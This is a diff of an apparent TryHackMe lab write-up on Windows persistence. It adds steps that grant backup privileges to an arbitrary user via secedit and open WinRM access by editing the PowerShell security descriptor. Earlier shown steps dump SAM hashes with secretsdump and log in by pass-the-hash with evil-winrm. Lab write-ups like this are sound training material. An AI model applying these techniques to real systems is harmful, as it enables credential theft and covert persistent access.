@@ -33,7 +33,7 @@ We will have to regain admin privileges by disabling the feature. Run the comman
 ![WLP3](/img/WLP3.png)
 8. Now `exit` out of the previous session and get back in same way as step 4. You will see the group is not active.
 ![WLP4](/img/WLP4.png)
-9. Now lets back up and dowload the SAM and SYSTEM files. Run Command as below:
+9. Now lets back up and download the SAM and SYSTEM files. Run Command as below:
 ![WLP5](/img/WLP5.png)
 10. Lets dump the password hashes with the files we downloaded (for some system glitch, I had to move to the attackbox provided by THM). Run the command: 
 `python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`
@@ -42,3 +42,22 @@ We will have to regain admin privileges by disabling the feature. Run the comman
 `evil-winrm -i 10.81.179.227 -u Administrator -H ff3118544--------80cfdb9c1fa`
 12. As hinted on the room, we have to run the `flag1.exe` for our first flag.
 ![WLP7](/img/WLP7.png)
+13. "Backup Operators" group has 2 privilege assigned by default - `SeBackupPrivilege` and `SeRestorePrivilege`. Let's assign such high privileges to ANY user, independent of their group memberships: (Run the command on the attached machine)
+`secedit /export /cfg config.inf`
+14. Edit the file in Notepad 
+![WLP8](/img/WLP8.png)
+![WL8-1](/img/WLP8-1.png)
+15. Converting the inf file to sdb file. Let's load the config back. Run the code:
+```
+secedit /import /cfg config.ini /db config.db
+secedit /configure /db config.db /cfg config.ini
+```
+16. New user with same privilege as Backup Operator is created but wont be able to log in via WinRM.
+Now lets change the **Security Descriptor** (instead of adding to Remote login group). Run the code: `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
+![WLP9](/img/WLP9.png)
+17. Lets change the permissions (see screenshot) to log in as `thmUser2`
+![WLP9-1](/img/WLP9-1.png)
+18. Now our user can connect via winRM with right permission and retrieve the `flag2.exe`
+`evil-winrm -i 10.81.181.37 -u thmuser2 -p Password321`
+![WLP10](/img/WLP10.png)
+19. 
